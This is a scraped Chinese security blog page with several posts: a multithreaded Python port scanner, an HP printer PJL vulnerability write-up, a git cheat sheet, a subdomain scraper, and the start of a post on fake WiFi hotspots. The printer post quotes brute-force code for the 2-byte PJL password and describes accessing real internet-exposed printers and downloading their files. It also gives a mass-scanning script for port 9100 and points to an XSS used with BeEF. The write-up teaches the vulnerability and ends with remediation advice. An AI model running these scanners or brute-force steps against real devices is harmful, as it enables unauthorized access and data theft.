<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330160826551-1914843565.png" alt=""></p>
<p>打开 ip_list.txt 文件：</p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330160907894-1222152171.png" alt=""></p>
<p>题外话： 使用 Firefox 的 Modify Headers 添加上 Authentication 这个 头信息后在浏览器里可以</p>
<p>直接看到返回的 JSON 字符串结果，如下 </p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330161207316-1843049358.png" alt=""></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ZoomEye/">ZoomEye</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-python-multithread-ports-scanner" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/09/python-multithread-ports-scanner/" class="article-date">
  	<time datetime="2016-03-09T09:26:32.000Z" itemprop="datePublished">2016-03-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/09/python-multithread-ports-scanner/">多线程端口扫描器的 Python 脚本</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x-00-Before-Coding"><a href="#0x-00-Before-Coding" class="headerlink" title="0x 00 Before Coding"></a>0x 00 Before Coding</h2><p>当端口打开时，向端口发送 TCP SYN 请求，会返回一个 ACK 响应:</p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309164525663-1708465423.png" alt=""></p>
<p>当端口关闭，返回的是 RST 响应：</p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309164613975-859417226.png" alt=""></p>
<h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><p>可以用 socket 编写一个小脚本来测试主机端口的开启情况，基本代码如下：</p>
<pre><code># coding: utf-8
#author: anka9080

import socket
from datetime import datetime

# Set time-out to get the scanning fast
socket.setdefaulttimeout(0.5)

# Ask for input
remote_server = raw_input(&quot;Enter a remote host to scan:&quot;)
remote_server_ip = socket.gethostbyname(remote_server)

# Print a nice banner with info on which host we are about to scan
print &apos;-&apos; * 60
print &apos;Please wait, scanning remote host &apos;, remote_server_ip
print &apos;-&apos; * 60

# Check what time the scan started
t1 = datetime.now()

# Using the range function to specify ports(1 - 1024)
# We also put in some error handling for catching errors
try:
    for port in range(1,1025):
        sock = socket.socket(2,1) # 2:socket.AF_INET 1:socket.SOCK_STREAM
        res = sock.connect_ex((remote_server_ip,port))
        if res == 0:
            print &apos;Port {}: OPEN&apos;.format(port)
        sock.close()

except socket.gaierror:
    print &apos;Hostname could not be resolved.Exiting&apos;

except socket.error:
    print &quot;Could&apos;t connect to the server&quot;

# Check the time now
t2 = datetime.now()

# Calculates the difference of time
total = t2 - t1

# Print the info to screen
print &apos;Scanning Completed in: &apos;, total
</code></pre><p>程序测试结果如下：</p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309165331772-1919340199.png" alt=""></p>
<p>看出来 在 socket 的超时时间设置为0.5的前提下 依然需要花费 8分27秒才能够把周知端口号扫完，有没有其他方式加快扫描速度？答案是有的。</p>
<blockquote>
<p>// <strong><strong><strong><strong><em>**</em></strong></strong></strong></strong> 该部分可以略过，本人踩到的一个小坑 </p>
</blockquote>
<p>　　打开 抓到的数据包列表，发现 timeout 包都会发送2个“伪重传”，发送这两个一般没什么用的数据包会占用 CPU的处理时间，</p>
<p>　　所以在想能不能不让程序发这两个包来提高效率？？</p>
<p>　　自己分析连续两个端口的时间间隔就会发现：间隔是0.5s（由 39号、46号、53号数据包分析得出），这恰好是在程序中设置的超时时间，</p>
<p>　　也就是说超时重传的包并不会占用专门的时间，所以这种想法就被干掉了。</p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309171312835-1560836350.png" alt=""></p>
<p>　　这样的话，1个端口0.5的超时等待，扫描一个主机的 1- 1024 号端口所用时间是可以大致估算下的：</p>
<p>　　1024 * 0.5 / 60 = 8.53 分钟左右。和上面程序实际扫描的时间（8分27秒）相符合。</p>
<blockquote>
<p>// 越过坑 ：P <strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></p>
</blockquote>
<h2 id="0x-02-Better-Coding"><a href="#0x-02-Better-Coding" class="headerlink" title="0x 02 Better Coding"></a>0x 02 Better Coding</h2><p>所以对于这种时间主要花费在 socket 连接( 非 CPU 计算密集型 )的程序 可以使用 多线程来提升效率，</p>
<p>这里选择使用内建的库 multiprocessing.dummy 来实现多线程扫描：</p>
<pre><code># coding: utf-8
# proj: 多线程 Socket TCP 端口扫描器
# author: anka9080

import socket
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

remote_server = raw_input(&quot;Enter a remote host to scan:&quot;)
remote_server_ip = socket.gethostbyname(remote_server)
ports = []

print &apos;-&apos; * 60
print &apos;Please wait, scanning remote host &apos;, remote_server_ip
print &apos;-&apos; * 60


socket.setdefaulttimeout(0.5)

def scan_port(port):
    try:
        s = socket.socket(2,1)
        res = s.connect_ex((remote_server_ip,port))
        if res == 0: # 如果端口开启 发送 hello 获取banner
            print &apos;Port {}: OPEN&apos;.format(port)
        s.close()
    except Exception,e:
        print str(e.message)



for i in range(1,1025):
    ports.append(i)

# Check what time the scan started
t1 = datetime.now()


pool = ThreadPool(processes = 8)
results = pool.map(scan_port,ports)
pool.close()
pool.join()

print &apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1
</code></pre><p>　扫描的结果如下：</p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309175531991-613764362.png" alt=""></p>
<p>　　可以发现 8 个线程并行发起请求，效率有很大的提升。</p>
<p>　　在被扫描主机未安装连接限制软件的前提下，测试了开启不同线程扫描所花费的时间 ：</p>
<ul>
<li>　　16 个线程 使用 32 秒扫完；</li>
<li>　　32个线程，使用 16 秒扫完；</li>
<li>　　64个线程，使用 8 秒扫完；</li>
<li>　　128个线程，使用 4 秒扫完；</li>
<li>　　256个线程，使用 2 秒扫完；</li>
<li>　　512个线程，使用 1.50 秒扫完；</li>
<li>　　1024个线程，使用 1.25 秒扫完；</li>
</ul>
<p><strong>至于开多少线程合适要自己来 fuzzing ， 不要以为开的线程越多越好，因为线程的创建，线程之间的切换也是要消耗资源的。</strong></p>
<p>要获取 Banner 的话，把核心函数修改成如下即可：</p>
<pre><code>def scan_port(port):
    try:
        s = socket.socket(2,1)
        res = s.connect_ex((remote_server_ip,port))
        if res == 0: # 如果端口开启 发送 hello 获取banner

            try:
                s.send(&apos;hello&apos;)
                banner = s.recv(1024)


            except Exception,e:
                print &apos;Port {}: OPEN&apos;.format(port)
                print str(e.message)
            else:
                print &apos;Port {}: OPEN&apos;.format(port)
                print &apos;Banner {}&apos;.format(banner)

        s.close()
    except Exception,e:
        print str(e.message)
</code></pre>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/多线程/">多线程</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/端口扫描/">端口扫描</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-printer-hack" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/02/printer-hack/" class="article-date">
  	<time datetime="2016-03-02T09:46:18.000Z" itemprop="datePublished">2016-03-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/02/printer-hack/">HP 打印机 PCL 漏洞分析与利用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x01-漏洞概要"><a href="#0x01-漏洞概要" class="headerlink" title="0x01 漏洞概要"></a>0x01 漏洞概要</h2><p>PCL代表打印机控制语言（Printer Control Language），由惠普公司开发，并被广泛使用的一种打印机协议。关于另一种页面描述语言，应该提一提由Adobe设计的PostScript（PS），它可以将更为复杂的事情交由绘图仪/打印机处理。PJL (Printer Job Language，打印机作业语言)作为PCL的扩展，用于指导打印机行为，比如更改设备设置、传输文件等。 若打印机的9100端口向公网开启，在向打印机发送PJL指令之前需要对使用者的身份进行认证，认证程序的密钥长度为２字节(Byte)，因此可以通过暴力破解认证密钥想打印机发送PJL指令，最终导致任意命令的执行。</p>
<p><strong>PJL</strong> (Printer Job Language)程序用于告诉打印机执行什么动作，是对PCL的额外支持。 PJL (Printer Job Language) 用于规范格式化页面的基本语言。本身是无害的，但却成为大多数解析器和解释器的漏洞利用代码。</p>
<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>打印机系统9100端口开启时，若连上该端口通过PJL指令发送设备名称请求并得到打印机的响应，说明可以未授权访问打印机，PJL保护机制的密钥由２个字节(16比特)的存储单位存储，可以进行暴力破解攻击，从而得到目标打印机的完全访问权限。</p>
<p>根据国外安全研究员PHENOELIT 已经写好了漏洞利用程序，对其中的主要代码进行分析，得到下面的流程图</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/flowchart.jpg" alt=""></p>
<p>下面是破解密钥部分的代码：</p>
<ul>
<li><p>在pjlsession.cpp中的230到256行</p>
<p>  String    ts;<br>  char numb[50];<br>  if ((pass==0)||(pass&gt;65535)) throw ExInvalid();#ifndef UNIX<br>  _snprintf(numb,49,”%u”,pass);#else<br>  snprintf(numb,49,”%u”,pass);#endif //UNIX<br>  connection.clear();<br>  connection.sendbuf.set(PJL_START);<br>  connection.sendbuf.append(“\r\n”);<br>  connection.sendbuf.append(“@PJL JOB PASSWORD=”);<br>  connection.sendbuf.append(numb);<br>  connection.sendbuf.append(“\r\n@PJL DEFAULT PASSWORD=0 \r\n”);<br>  connection.sendbuf.append(“@PJL EOJ\r\n”);<br>  connection.sendbuf.append(PJL_FINISH);<br>  connection.senddata();<br>  // TEST !!!<br>  // connection.recvatleast(9,ctimeout);<br>  // end TEST<br>  connection.sendbuf.clear();</p>
</li>
</ul>
<p>因为打印机所使用的密码长度只有2个字节，即16个bit, 65535中表示方法，所以密码范围在0到65535之间，这就是为什么程序能暴力破解打印机认证密码。<br>connection.sendbuf.set()后面根据PJL协议发送指定的数据包。使攻击者在破解密码之后可以用里面的命令进行任意操作了。</p>
<h2 id="0x03-案例分析"><a href="#0x03-案例分析" class="headerlink" title="0x03 案例分析"></a>0x03 案例分析</h2><p>首先获取可能存在漏洞的打印机IP地址，打开www.zoomeye.org，输入漏洞关键字 HP LaserJet 进行搜索。搜索结果如下：</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/HP-LaserJet.jpg" alt=""></p>
<p>从结果中可以看到一些带有 HP LaserJet 标签的互联网主机和所属国家信息，这些主机就很有可能隐藏着打印机漏洞。我们从中选取一些进行测试。</p>
<p><strong>Nmap端口扫描</strong></p>
<p>Nmap的扫描结果显示主机不但开启了9100端口，80，443，23端口也开着，入侵也就多了一些其他的方式。</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/Nmap.jpg" alt=""></p>
<p>我们使用 PHENOELIT 开发的PFT工具来进行渗透测试。这个用C++写成的黑客工具有简单的命令行交互界面，专门用来破解PLJ接口的打印机，获取打印机的环境变量、文件系统和重要目标文件。</p>
<p><strong>PFT密码破解</strong></p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/pft.jpg" alt=""></p>
<p>我们运行PFT工具，用 help 命令查看帮助文档</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/help.jpg" alt=""></p>
<p>可以用PFT提供的暴力破解功能清除掉打印机的 PJL 程序保护。</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/bruteforce.jpg" alt=""></p>
<p>显示密码清除成功，使用 ls 命令查看打印机上硬盘里的文件：</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/remote.jpg" alt=""></p>
<p>在这里可以查看打印机硬盘中存放的所有东西。如果打印机缓存了打印文件，在这里也是可以找到的。我们可以进入一个目录选择一个文件下载到本地：</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/download.jpg" alt=""></p>
<p>查看L006105.XML文件的内容：</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/xml.jpg" alt=""></p>
<p>在这里可以查看到一些诸如本次打印的任务主机IP，邮箱，打印的文件名等敏感信息。</p>
<p><strong>XSS攻击</strong></p>
<p>存在于惠普打印机中风险的仅仅是拒绝服务,信息泄漏这么简单吗?在 Exploit-DB网站 中找到 HPLaserJet printers - Multiple Stored XSS Vulnerabilities(点击连接) 惠普打印机的多个存储型 XSS 漏洞, 对应 CVE 号: CVE-2012-3272 没给出利用方式，试着打开浏览器Fuzz了出来： 点击WEB的“支持信息”连接</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/support.jpg" alt=""></p>
<p>点击 Apply 按钮，出现了 XSS 弹框：</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/xss.jpg" alt=""></p>
<p>利用该漏洞，配合 Beef 攻击框架，通过一段编写好的 JavaScript（hook.js）控制目标主机的浏览器，通过目标主机浏览器获得该主机的详细信息，并进一步扫描内网，配合 Metasploit 绝对是内网渗透一大杀器。</p>
<h2 id="0x04-全球漏洞分布"><a href="#0x04-全球漏洞分布" class="headerlink" title="0x04 全球漏洞分布"></a>0x04 全球漏洞分布</h2><p><strong> 自动测试脚本 </strong></p>
<p>HP打印机的厂商已经对固件进行了升级，采用更安全的加密机制处理PJL密钥，不过由于全球范围用户基数比较大，已经用户安全意识不强，依然大量存在这种受害打印机，由ZoomEye网络空间搜索引擎导出的数据接合我们小组写的自动化扫描脚本。</p>
<pre><code>#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import socket
import json
import sys
from optparse import OptionParser

PJL_START = &quot;\033%-12345X@PJL &quot;
PJL_FINISH = &quot;\033%-12345X\r\n&quot;
PJL_USTATUS = &quot;USTATUS DEVICE=&quot;
PJL_INFO_ID = &quot;INFO ID\r\n&quot;

EOF = PJL_START + PJL_USTATUS + &quot;OFF\r\n&quot; + PJL_FINISH  #PJL  语言
DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  #PJL  语言  获取设备型号

class Printer():
    def __init__(self):
        self.usage()
        if sys.argv &lt; 1 :
            self.usage()
        self.readfile(options.file)

    def usage(self):
        parser = OptionParser()
        parser.add_option(&quot;-i&quot;, &quot;--ip&quot;, dest=&quot;ip&quot;,
                          help=&quot;test single ip&quot;)  #
        parser.add_option(&quot;-f&quot;, &quot;--file&quot;,dest=&quot;file&quot;,
                          help=&quot;files &quot;) #
        global options
        (options, args) = parser.parse_args()

    def Buildsocket(self, ip, port=9100):
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)   #与主机建立socket连接
        sock.settimeout(5)
        try:
            sock.connect((ip, port))
        except:
            print &quot;[!*]-ip-%s-can&apos;t connect--&quot; % ip
            return &apos;error&apos;
        sock.send(EOF)
        sock.send(DEVICEID)   # 发送PJL指令给远程打印机
        try:
            device = sock.recv(1024)
        except:
            return &apos;No&apos;
        print &quot;[!*]-ip-%s-is-ok\r\ndeviceidis-%s&quot; % (str(ip), device)
        sock.close()
        return &apos;OK&apos;

    def GetDiviceMap(self, data,status):
        f = open(&apos;result.txt&apos;, &apos;a+&apos;)
        try:
            f.write(str(data[&apos;ip&apos;]) + &apos;, &apos; + status + &apos;, &apos; + str(data[&apos;geoinfo&apos;][&apos;country&apos;][&apos;name&apos;][&apos;en&apos;])
            +&apos;, &apos;+ str(data[&apos;geoinfo&apos;][&apos;city&apos;][&apos;en&apos;]) + &apos;, &apos; + str(data[&apos;geoinfo&apos;][&apos;location&apos;][&apos;longitude&apos;])
            +&apos;, &apos;+ str(data[&apos;geoinfo&apos;][&apos;location&apos;][&apos;latitude&apos;]) + &apos;, &apos; + str(data[&apos;geoinfo&apos;][&apos;country&apos;][&apos;code&apos;])
            +&apos;, &apos; + str(data[&apos;geoinfo&apos;][&apos;continent&apos;][&apos;name&apos;][&apos;en&apos;]) + &quot;\r\n&quot;)
        except:
            pass
        f.close()

    def readfile(self, file):
        Vuln_ip = 0 # ip 列表输入的IP数量
        No_vuln_ip = 0
        CantConnectIP = 0
        linenum = 0
        f = open(file, &apos;r&apos;)
        for line in f.readlines():
            data = json.loads(line)
            status = self.Buildsocket(data[&apos;ip&apos;])
            if status == &apos;error&apos;:
                CantConnectIP += 1
            elif status == &apos;No&apos;:
                No_vuln_ip += 1
            else:
                Vuln_ip += 1
            self.GetDiviceMap(data, status)
            linenum += 1
            print &quot;[!*]-Now-is-%s-lines&quot; % str(linenum)
        f.close()
        print str(CantConnectIP) + &quot;  &quot; + str(No_vuln_ip) + &quot;  &quot; + str(Vuln_ip)

if __name__ == &apos;__main__&apos;:
    Printer()
</code></pre><p>全球影响面</p>
<p>这个漏洞波及了很多国家和地区，以美国最盛。我们用小组开发的自动化脚本加上ZoomEye提供的1万组惠普打印机IP进行测试。 结果绘制成图表如下。</p>
<ul>
<li>全球可入侵IP分布</li>
</ul>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/hacked2.jpg" alt=""></p>
<ul>
<li>全球已修复IP分布</li>
</ul>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/non-hacked.jpg" alt=""></p>
<p>可以看到，美国是 PCL 打印机漏洞的重灾区，至今还拥有数量最多的漏洞主机。韩国也受到了很大的影响。其他国家，包括中国，有漏洞的打印机数量都不多，而且一半以上已被修复。</p>
<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/exploit-ratio.jpg" alt=""></p>
<h2 id="0x05-修补建议"><a href="#0x05-修补建议" class="headerlink" title="0x05 修补建议"></a>0x05 修补建议</h2><p>对打印机管理员有以下建议：</p>
<ul>
<li>不使用的服务，如 FTP ，TELNET 服务，应手动关闭。</li>
<li>直接关闭 9100 端口，不允许外网访问。</li>
<li>不要使用公网 IP 作为打印机地址。</li>
<li>关注产品动态，保证及时更新。</li>
</ul>
<p>本文由 我和另外两个小伙伴 fengxuan zhufengdaaa 完成。</p>
<p>参考网址：</p>
<p><a href="https://www.altamiracorp.com/blog/employee-posts/hacking-hp-printers-for-fun-profit" target="_blank" rel="external">https://www.altamiracorp.com/blog/employee-posts/hacking-hp-printers-for-fun-profit</a></p>
<p><a href="https://en.wikipedia.org/wiki/Printer_Job_Language" target="_blank" rel="external">https://en.wikipedia.org/wiki/Printer_Job_Language</a></p>
<p><a href="http://www.51cto.com/art/200508/7989.htm" target="_blank" rel="external">http://www.51cto.com/art/200508/7989.htm</a></p>
<p><a href="https://www.exploit-db.com/exploits/10011/" target="_blank" rel="external">https://www.exploit-db.com/exploits/10011/</a></p>
<p><a href="http://www.freebuf.com/articles/system/7115.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/7115.html</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/打印机漏洞/">打印机漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-github-cmd" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/07/10/github-cmd/" class="article-date">
  	<time datetime="2015-07-10T09:42:04.000Z" itemprop="datePublished">2015-07-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/07/10/github-cmd/">GitHub 常用命令备忘录</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>git init 把当前目录变成Git可以管理的仓库<br>随后出现.git目录，这个目录是Git来跟踪管理版本库的<br>git commit -m “change message” 提交代码到Git<br>git add file1.txt<br>git add file2.txt 先添加多个文件 之后一起提交</p>
<p>git status 命令可以让我们时刻掌握仓库当前的状态<br>比如：文件是否被修改，修改后是否提交<br>git diff readme.txt 查看这个文件上次修改具体改了那些内容</p>
<p>git中的一次commit 是仓库的一个快照，一旦文件出现了差错，可以从最近的一个<br>commit恢复<br>git log 显示最近到最远的提交日志，用于回溯版本</p>
<p>get reset –hard [HEAD^|commit id]</p>
<p>git reflog 现实对版本库的各种操作记录，用于重返未来</p>
<p>工作区：电脑里能看到的目录<br>版本库：.git（隐藏目录），Git的版本库<br>Git的版本库里有很多东西，其中最重要的就是stage（暂存区）+master<br>把文件往Git版本库里提交的时候，分两步执行：<br>git add 把 文件添加到暂存区<br>git commit 把暂存区的所有文件提交到当前分支</p>
<p>一旦提交后，如果没有对工作区做任何修改，那么工作区的status就是“干净”的</p>
<p>第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git commit<br>git commit负责的是把暂存去的文件提交了，第二次修改的内容u会被提交。<br>正确步骤：第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git add -&gt; git commit<br>git diff HEAD –readme.txt 查看工作区和版本库里面最新版本的区别</p>
<p>git checkout –readme.txt 用版本库里的版本替换工作区的版本<br>有两种情况：<br>readme.txt 自修改后还没有放到缓存区，执行后会回到和版本库一模一样的状态。<br>readme.txt 已经添加到暂存区后，又做了修改，<br>总之，是让这个文件回到最近一次git commit 或 git add的状态</p>
<p>git reset HEAD file 把暂存区的修改回退到工作区（unstage）</p>
<p>git rm test.txt 删除版本库的test.txt文件</p>
<p>git push -u origin master 将本地库所有的内容推送到远程库上</p>
<p>git checkout -b dev 创建dev分支并切换<br>相当于下面两条命令：<br>git branch dev + git checkout dev<br>git branch 列出所有分支，当前分支会标*号<br>git checkout master 切换到master分支</p>
<p>git merge dev 把dev分支的工作成功合并到master分支上<br>git branch -d dev 删除dev分支</p>
<p>带参数的git log 看到分支的合并情况<br>git log –graph –pretty=oneline –abbrev-commit</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GitHub/">GitHub</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-python-spider-subdomain-ip" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/06/10/python-spider-subdomain-ip/" class="article-date">
  	<time datetime="2015-06-10T09:09:11.000Z" itemprop="datePublished">2015-06-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/06/10/python-spider-subdomain-ip/">Python 爬虫获取指定主机子域名及IP信息</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="http://images0.cnblogs.com/blog2015/671902/201506/100041310046606.png" alt=""></p>
<h2 id="0x-00-前言"><a href="#0x-00-前言" class="headerlink" title="0x 00 前言"></a>0x 00 前言</h2><p>前天自己在玩的时候，自己通过百度搜索主机的二级域名感觉好麻烦，自已要一页页的去翻</p>
<p>而且人工识别是否是重复的二级域名也够蛋疼的，正好最近在学正则表达式，权当练手了</p>
<p>2016年更新：<br>发现了一些不错的扫子域名的网站，如下</p>
<p><strong><a href="http://subdomain.chaxun.la" target="_blank" rel="external">http://subdomain.chaxun.la</a></strong></p>
<h2 id="0x-01-Code"><a href="#0x-01-Code" class="headerlink" title="0x 01 Code"></a>0x 01 Code</h2><pre><code># coding=utf-8
# author:Anka9080
# environment:Eclipse

import urllib
import urllib2
import cookielib
import re


#site = &apos;baidu.com&apos;
print &apos;Please input the root site like &quot;baidu.com&quot;:&apos;
site = raw_input()
siteFormat1 = site
siteFormat1 = siteFormat1.replace(&apos;.&apos;, &apos;\.&apos;)
#print siteFormat1

urlPage = &apos;http://www.haosou.com/s?src=360sou_newhome&amp;q=site:&apos;+site
req = urllib2.Request(urlPage)
res = urllib2.urlopen(req)
html = res.read().decode(&apos;utf-8&apos;)
# 获得搜索结果的页面数
pageStr = re.search(ur&apos;找到相关结果约(.*?)个&apos;,html)
page = pageStr.group(1)
formatNum = &apos;0123456789&apos;
for c in page:
    if not c in formatNum:
        page = page.replace(c,&apos;&apos;)
page = int(page) / 10
print &apos;Total Page: &apos; + str(page)

if page &gt; 6:
    page = 6
newItems = []
for p in range(1, page):
    urlDomain = &apos;http://www.haosou.com/s?src=360sou_newhome&amp;q=site:&apos;+site+&apos;&amp;pn=&apos;+str(p)
    req = urllib2.Request(urlDomain)
    res = urllib2.urlopen(req)
    html = res.read().decode(&apos;utf-8&apos;)
    tmp = &apos;linkinfo\&quot;\&gt;\&lt;cite\&gt;(.+?\.&apos;+siteFormat1+&apos;)&apos;;
    pattern = re.compile(tmp)        
    items = re.findall(pattern, html)


    # 去重操作
    for item in items:
        if item not in newItems:  
            newItems.append(item)

print &apos;SubDomain Count: &apos;+ str(len(newItems) - 1)

for item in newItems: 

    # 获得对应 IP 信息
    pattern = re.compile(ur&apos;\&gt;\&gt;\ (.*?)\&lt;\/font[\s|\S]*?本站主数据：(.*?)\&lt;\/li\&gt;&apos;)
    urlIP = &apos;http://www.ip138.com/ips138.asp?ip=&apos;+item
    req = urllib2.Request(urlIP)
    res = urllib2.urlopen(req)
    html = res.read().decode(&apos;gb2312&apos;)    
    result = re.search(pattern,html)
    print item + &apos;    &apos; + result.group(1) + &apos;    &apos; + result.group(2)
</code></pre><p>脚本运行结果如下：</p>
<pre><code>Please input the root site like &quot;baidu.com&quot;:
baidu.com
Total Page: 2
SubDomain Count: 9
www.baidu.com    61.135.169.121    北京市 百度蜘蛛 联通
tieba.baidu.com    123.125.65.93    北京市  联通
fanyi.baidu.com    202.108.23.153    北京市  联通
wenku.baidu.com    123.125.70.102    北京市 百度蜘蛛 联通
map.baidu.com    112.80.248.48    江苏省南京市  联通
music.baidu.com    123.125.114.14    北京市  联通
zhidao.baidu.com    123.125.65.91    北京市  联通
baike.baidu.com    123.125.70.105    北京市 百度蜘蛛 联通
yun.baidu.com    123.125.65.51    北京市  联通
pan.baidu.com    202.108.23.29    北京市  联通
</code></pre><h2 id="0x-02-总结"><a href="#0x-02-总结" class="headerlink" title="0x 02 总结"></a>0x 02 总结</h2><p>　　　　思路大概是这个样子：</p>
<p>　　　　先通过<strong>urllib2.Request()</strong> 和<strong> urllib2.urlopen()</strong>访问url</p>
<p>　　　　再从返回结果中得到搜索结果页面数 </p>
<p>　　　　为了提高效率 页面数 大于 5 会只爬行搜索结果的前5个页面</p>
<p>　　　　后面 又做了去重操作 然后就得到二级域名列表咯 : )</p>
<p>　　　　中间蛋疼的 地方倒是 Py 的 转义符号问题  身边能有个可以问问的大牛多好~</p>
<p>　　　　后期 准备使用 <a href="http://dns.aizhan.com/" target="_blank" rel="external">http://dns.aizhan.com/</a> 的查询结果 直接获得 IP以及旁站信息</p>
<p>　　　　==================6.13号更新====================</p>
<p>　　　　现在已经可以查出二级域名对应的IP地址以及地理位置信息</p>
<p>　　　　感觉<a href="http://dns.aizhan.com" target="_blank" rel="external">http://dns.aizhan.com</a> 的调用比较麻烦，接口已经换成 <a href="http://www.ip138.com" target="_blank" rel="external">http://www.ip138.com</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python脚本/">Python脚本</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-fake-wifi-ap" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/01/02/fake-wifi-ap/" class="article-date">
  	<time datetime="2015-01-02T08:58:22.000Z" itemprop="datePublished">2015-01-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/01/02/fake-wifi-ap/">搭建假冒 WIFI 热点等小(mei)白(zhi)兔(men)来蹭网啊 - -。</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="http://images.cnitblog.com/blog/671902/201501/021952499038190.png" alt=""></p>
<h2 id="0x-00-╮-╯▽╰-╭"><a href="#0x-00-╮-╯▽╰-╭" class="headerlink" title="0x 00 ╮(╯▽╰)╭"></a>0x 00 ╮(╯▽╰)╭</h2><p>　　　　请喊我万恶的标题党  哈哈哈哈哈</p>
<h2 id="0x-01-这里正题"><a href="#0x-01-这里正题" class="headerlink" title="0x 01 这里正题"></a>0x 01 这里正题</h2><p>　　　　虚拟机（Kali）不支持内置网卡，还好我有神器，插上我的RT8187L，开始搞起</p>
<p>　　　　参考资料：zone.wooyun.org/content/2562</p>
<p>　　　　下面看攻击测试吧</p>
